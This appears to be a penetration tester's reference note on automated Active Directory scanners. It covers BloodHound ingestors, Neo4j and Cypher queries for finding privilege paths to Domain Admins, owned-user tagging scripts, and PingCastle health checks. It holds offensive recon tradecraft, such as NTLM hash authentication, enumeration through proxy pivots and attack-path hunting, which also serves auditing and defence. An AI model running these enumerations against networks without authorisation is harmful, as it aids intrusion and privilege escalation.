# Active Directory - Automatic scanners

### BloodHound

`BloodHound` uses graph theory to reveal the hidden and often unintended
relationships within an Active Directory environment. `BloodHound` can be used
to easily identify highly complex attack paths that would otherwise be
impossible to quickly identify.

The official installation procedure is available on the `GitHub` repository:
`https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started`

###### BloodHound ingestors

*SharpHound*

`SharpHound` is a C# data ingestor used by `BloodHound` to enumerate the Active
Directory targeted domain. A PowerShell script `SharpHound.ps1`, in-lining the
C# DLL, is available as well.

By default, `SharpHound` will output multiples JSON files in a compressed zip
archive file that can directly be imported for graphical review and query in
`BloodHound`.

Multiples collection methods are available:

| CollectionMethod | Description |
|------------------|-------------|
| Default | Performs group membership collection, domain trust collection, local admin collection, and session collection |
| Group | Performs group membership collection |
| LocalAdmin | Performs local admin collection |
| LocalGroup | Performs local groups collection. No longer uses the `NetLocalGroupGetMembers` Windows API, rely instead on lower-levels API calls to the `SAMRPC` library to access the remote computer SAM |
| RDP | Performs Remote Desktop Users collection |
| DCOM | Performs Distributed COM Users collection |
| GPOLocalGroup | Performs local admin collection using Group Policy Objects |
| Session | Performs session collection |
| ComputerOnly | Performs local admin, RDP, DCOM and session collection |
| LoggedOn | Performs privileged session collection (requires admin rights on target systems) |
| Trusts | Performs domain trust enumeration |
| ACL | Performs collection of ACLs |
| Container | Performs collection of Containers |
| DcOnly | Performs collection using LDAP only. Includes Group, Trusts, ACL, ObjectProps, Container, and GPOLocalGroup. |
| All | Performs all Collection Methods except GPOLocalGroup |

Usage:

```bash
# PowerShell SharpHound.ps1 collector.
# The SharpHound.ps1 PowerShell collector script in-lines the SharpHound C# DLL.
# Multiple ways can be used to import or directly inject into memory the SharpHound.ps1 script.
Import-Module SharpHound.ps1

```

*BloodHound.py*

`bloodhound-python.py` is a Python based ingestor for `BloodHound`, based on
the `Impacket` suite and only compatible with `BloodHound 3.0`, or newer
versions. `bloodhound-python.py` presents the main advantage of being usable on
Linux systems and thus easily integrates with `proxychains` for pivoted Active
Directory enumeration.

`bloodhound-python.py` supports most of `SharpHound` collect methods, specified
above, except `GPOLocalGroup` and `LocalGroup`.

```bash
bloodhound-python -v -CollectionMethod  <all | DcOnly | <COLLECTION_METHOD>

# The specified domain controller must be a hostname. The -ns must be specified to a DNS server IP if the DC hostname is not resolved by the local system.
# --dns-tcp: The DNS queries will be made over TCP instead of UDP, useful to enumerate over SOCKS4 proxies which do not support the UDP protocol.
bloodhound-python -v --dns-tcp -dc <DC_HOSTNAME> -ns <DNS_SERVER_IP> -d <DOMAIN_FQDN> -u <USERNAME> [-p <PASSWORD> | --hashes ':<NTLM>'] -CollectionMethod  <all | DcOnly | <COLLECTION_METHOD>
```

*Sysinternals's AdExplorer and ADExplorerSnapshot.py*

Active Directory domain snapshots taken with `AdExplorer` can be converted to
`JSON` files supported by `BloodHound` using the
[`ADExplorerSnapshot.py`](https://github.com/c3c/ADExplorerSnapshot.py) Python
script. `AdExplorer` can thus be used as an ingestor for `BloodHound`. Refer to
the `[ActiveDirectory] Recon - Domain Recon` note for more information on
`AdExplorer`.

A few limitations are however to be noted:
  - the snapshot only contains information on Active Directory objects
    (assimilable to a `DcOnly` collection made with `SharpHound`).
  - `Organizational Units` and `Group Policy Objects` information will be
    missing.

```
ADExplorerSnapshot.py [-o <OUTPUT_FOLDER>] <ADEXPLORER_SNAPSHOT>
```

The resulting `JSON` files can be imported normally through the `BloodHound`
graphical interface.

###### Multiple Neo4j databases to handle different environments

The [`Neo4j Desktop`](https://neo4j.com/download/) application can be used to
create and manage multiple databases. Due to `Neo4j Community` limitations, the
usage of the thick client is required as having multiple databases is otherwise
a feature of the `Enterprise` edition (as of 2022-01). Using multiple databases
present the notable advantage of allowing oneself to work on different
environments without requiring clears of the database and data reuploads.

The procedure to create multiple Neo4j databases through the `Neo4j Desktop`
application is as follow:

  1. Create a new project: `Projects (left menu) -> New`.

  2. Adds a `Local DBMS` per environment, forest or domain (depending on the
     level of separation wished):
     `Newly created project right panel -> (+) Add -> Local DBMS`. The name
     specified for the `DBMS` can match the environment / forest / domain (for
     example), and the password should be identical between `DBMS`.

     Each `Local DBMS` will be composed of the default `system` and `neo4j`
     databases.

  3. Switch between `DBMS`
     (`Mouse over the DBMS in the project right panel -> Start`) and add data as
     needed through the `BloodHound` interface.

Once the different databases are populated, simply starting a `DBMS` through the
`Neo4j Desktop` application allows to switch to a different environment in
`BloodHound` (without having to login / logoff or restart `BloodHound`).

###### BloodHound GUI

The following commands can be used to start `BloodHound`. The default neo4j
credentials are `neo4j:neo4j` and must be changed for the first login.

```bash
# Windows
net start neo4j
.\BloodHound.exe

# Linux
# "neo4j start" may lead to errors if executed as non root account.
neo4j start
neo4j console

bloodhound
```

The zip archive files produced by `SharpHound` can simply be drag and dropped
in the `BloodHound` graphical interface for treatment. The `Upload` button
on the right may be used as well.

###### BloodHound / Neo4j Cypher queries

*Neo4j Cyper 101*

The `Neo4j` graph databases implements its own query language: `Cypher`. Raw
`Cypher` queries can be made directly through the `BloodHound` GUI interface,
in complement to the predefined `BloodHound` queries. Queries may also be
executed through the `Neo4j` console (by default accessible using the `Neo4j`
web interface at `http://localhost:7474/browser/`). The `Neo4j` console
automatically display by default all the edges between nodes, which may be
useful in some case but is more resources intensive.

`Cypher` is a "visual" language modeling a starting and ending nodes, linked by
an edge. Queries are constructed using parenthesis, brackets, and arrow, with a
very basic query looking like:

```
(StartNode)-[IsConnectedTo]->(EndNode)
```

`Cypher` implements two basic clauses, `MATCH` and `RETURN`:
  - The `MATCH` clause specify the patterns `Neo4j` will search for in the
  database. `MATCH` is often coupled to a `WHERE` conditional statement that
  adds restrictions to the data retrieved.
  - The `RETURN` clause defines what to include in the query result
  set, which can be nodes, relationships, or nodes / relationships properties.

The relationship type and depth can be specified inside the brackets. For
instance, the following link `-[r:MemberOf]->` specify that the starting node
should be a direct member of the group ending node, while the link
`-[r:MemberOf*1..]->` indicate that the `MemberOf` relationship may repeat any
number of time and thus the starting node may be recursively a member of the
group ending node.

`Neo4j` `Cypher` also implements the `shortestPath` and `allShortestPaths`
functions that return, respectively, the shortest path and all the shortest
paths (all paths with the same minimal amount of hops) from a starting node,
or set of nodes, to an ending node, or set of nodes.

The following basic queries illustrate the use of the `MATCH` and `RETURN`
clauses as well as the linking syntax:

```
# Returns all Nodes in the database
MATCH (X) RETURN X

# Returns all domain in the database (and their relationships if executed through the Neo4j console)
MATCH (X:Domain) RETURN X
# With relationships from BloodHound GUI
MATCH p=(n:Domain)-[r]-(m:Domain) RETURN p

# Returns all users in the database
MATCH (X:User) RETURN X

# Returns all groups in the database
MATCH (X:Group) RETURN X

# Returns all computers in the database
MATCH (X:Computer) RETURN X

# Returns all OU in the database
MATCH (X:OU) RETURN X

# Returns all GPO in the database
MATCH (X:GPO) RETURN X

# Return the <OBJECT> (User, Group, Computer, OU or GPO) <NAME> (SAMACCOUNTNAME@DOMAIN_FQDN). Both queries are equivalent.
MATCH (n:<OBJECT> {name:"<NAME>"}) RETURN n
MATCH (n:<OBJECT>) WHERE n.name = "<NAME>" RETURN n

# Return the security principals directly member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf]->(c:Group {name: "<GROUP>"}) RETURN p

# Return all the security principals recursively member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf*1..]->(c:Group {name: "<GROUP>"}) RETURN p

# Return the names of the groups the specified user is a member of.
MATCH (u:User) WHERE u.name =~ "<USERNAME_IN_CAPS>@<DOMAIN_FQDN_IN_CAPS>" MATCH p=(u)-[b:MemberOf*1..]->(g:Group) RETURN g.name

# Return the path of the specified relationship type from any object to any objects
MATCH p=()-[r:<RELATIONSHIP>*1..]->() RETURN p

# Return shortest path from the Domain Users group to Domain Admins group
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p

# Return all shortest paths from Domain Users to Domain Admins
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=allShortestPaths((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
```

The following operators are supported in the conditional `WHERE` statements:

| Operator | Definition |
|----------|-----------|
| NOT | Negate the subsequent condition |
| = | Is equal to |
| <> | is different to |
| < | Is less than |
| <= | Is less or equal
| > | Greater than |
| >= | Is greater or equal to |
| IS NULL | Is null |
| IS NOT NULL | Is not null |
| STARTS WITH | String starts with |
| ENDS WITH | String ends with |
| CONTAINS | String contains |
| =~ | String RegEx search |

The relationship between nodes can be of the following types:
  - `AddAllowedToAct`
  - `AddMember`
  - `AdminTo`
  - `AllExtendedRights`
  - `AllowedToAct`
  - `AllowedToDelegate`
  - `CanPSRemote`
  - `CanRDP`
  - `Contains`
  - `ExecuteDCOM`
  - `ForceChangePassword`
  - `GenericAll`
  - `GenericWrite`
  - `GetChanges`
  - `GetChangesAll`
  - `GPLink`
  - `HasSession`
  - `HasSIDHistory`
  - `Owns`
  - `MemberOf`
  - `ReadGMSAPassword`
  - `ReadLAPSPassword`
  - `SQLAdmin`
  - `TrustedBy`
  - `WriteDACL`
  - `WriteOwner`

###### (Dirty) Manual analysis of SharpHound results

For larger Active Directory domains, specifics search on the `SharpHound`
resulting JSON files may be used to more rapidly identify entry point, such as
resources accessible to following groups:
- `Everyone`, SID: `S-1-1-0`
- `Anonymous`, SID: `S-1-5-7`
- `Authenticated Users`, SID: `S-1-5-11`
- `Users`, SID: `S-1-5-32-545`
- `Domain Users`, SID: `S-1-5-<DOMAIN>-513`
- `Domain Computers`, SID: `S-1-5-<DOMAIN>-515`

The following bash script can be used to convert the one-line JSON result of
`SharpHound` to a more human readable format:

```bash
#!/bin/bash
for filename in *.json; do
  echo $filename
  jq --color-output . $filename > $filename.jq
done
```

```bash
grep -A 10 -B 10 -rin "S-1-1-0\|S-1-5-7\|S-1-5-11\|S-1-5-32-545" *.jq
```

###### [Linux] BloodHound Owned

The `bh-owned.rb` ruby script can be used to automatically tag the provided
users from a file as owned or blacklist.

```bash
ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

Note that the usernames must correspond to the `BloodHound` expected node
format: `UPPERCASE_USERNAME@UPPERCASE_DOMAIN_FQDN`.

```bash
#!/bin/bash

users_file='<USERNAMES_FILE>'
users_fqdn='<UPPERCASE_DOMAIN_FQDN>'

touch ./tmp_file
cat $users_file | while read line; do
  echo $line"@"$users_fqdn >> ./tmp_file
done

awk '{print toupper($0)}' < ./tmp_file > formated_users_file.txt
rm -rf ./tmp_file

ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

### PingCastle

`PingCastle` is an `C#` application designed to run a number of security
checks, targeting the most common Active Directory security issues.
`PingCastle` generates an `HTLM` report summarizing the findings for the
`healthcheck` mode or produces text files for the individual modules.

Note that the licensing model of `PingCastle` specify the following:
  - "Except if a license is purchased, you are not allowed to make any profit
  from this source code"
  - "It is allowed to run PingCastle without purchasing any license on for
  profit companies if the company itself (or its ITSM provider) run it"

So in order to legally make use of `PingCastle`, a license must be purchased by
the auditor or the scans must be conducted by the audited company and the
results communicated to the auditors.

The `healthcheck` mode runs more that fifty checks, including:
  - Enumeration of the members of the domain privileged groups (`Enterprise
    Admins`, `Domain Admins`, built-in `Operators` groups, etc.).
  - Creation of a limited Active Directory control path graph to privileged
    groups, similar in nature but not as complete to what can be accomplished
    using `BloodHound`. `PingCastle`'s control path graphs are based on group
    memberships, `GPO` mapping and `Access Control List (ACL)` on privileged
    objects and can be visualized in the `Control Paths Analysis` section by
    clicking on the `Analysis` link of each privileged group.
  - Enumeration of the operating systems in use on the computers integrated to
    the Active Directory domain.
  - Enumeration of Active Directory privileges group memberships and
    users with the `admincount` bit set to 1 (accounts protected by the
    `AdminSdHolder` mechanism).
  - Verification of privileges security principals' and GPO's ACLs.
  - Search of `GPP` passwords and restricted groups definition in GPO.
  - Verification of the implementation of `Local Administrator Password
    Solution (LAPS)` and `Windows Event Forwarding` solutions.
  - Enumeration of privileged accounts that define a `ServicePrincipalName
    (SPN)` (and are thus prone to `Kerberoasting` attack).
  - Listing of user and machine accounts that can have an empty password as
    well as user accounts that do not require `Kerberos` pre-authentication
    (and are thus vulnerable to `ASP-Roast` attacks).
  - Enumeration of domain configured trusts.
  - Verification if the `Exchange Windows Permissions` security principal has
    the `WriteDacl` right in the root domain security descriptor
  - etc.

`PingCastle` can also be used to run a number of specific security scans
through various `modules`:

In order to execute `PingCastle` on a computer with out the `.NET framework
3.5` installed, the `PingCastle.pdb` and `PingCastle.exe.config` files must be
present in the same directory as the `PingCastle.exe` binary.

`PingCastle` can be launched in `interactive mode` using the current user
security context or with a specified account using the following commands.
Before running the `PingCastle`'s `healthcheck` mode, it is recommended to
remove the limitation of 100 users in the generated `HTML` report:
`5-advanced -> 4-noenumlimit`.

```bash
# Runs PingCastle in interactive mode.
PingCastle.exe

# Runs PingCastle's healthcheck mode with out the limitation of 100 users.
PingCastle.exe --no-enum-limit --healthcheck

# Runs the PingCastle's healthcheck on the specified domain using the provided credentials.
PingCastle.exe --server <DC_FQDN | DC_IP> --user "<DOMAIN>\<USERNAME>" --password "<PASSWORD>" --no-enum-limit --interactive

# Runs the PingCastle's healthcheck on all trusted domains.
# --explore-trust: on domains of a forest, runs the healthcheck on all trusted domains except domains of the forest and forest trusts.
# --explore-forest-trust: on the root domain of a forest, runs the healthcheck on all forest trusts discovered.
PingCastle.exe --explore-trust --explore-forest-trust --no-enum-limit --healthcheck

# Runs the specified scanner module.
PingCastle.exe --scanner "<MODULE_NAME>"
PingCastle.exe --server <DC_FQDN | DC_IP> --user "<DOMAIN>\<USERNAME>" --password "<PASSWORD>" --scanner "<MODULE_NAME>"

# Runs, as of PingCastle version 2.9.0.0, all the PingCastle available scanner modules.
$modules = @("aclcheck", "smb", "share", "localadmin", "spooler", "antivirus", "export_user", "foreignusers", "laps_bitlocker", "smb3querynetwork", "nullsession", "nullsession-trust", "oxidbindings")

foreach ($module in $modules) {
   .\PingCastle.exe --scanner "$module"
}
```
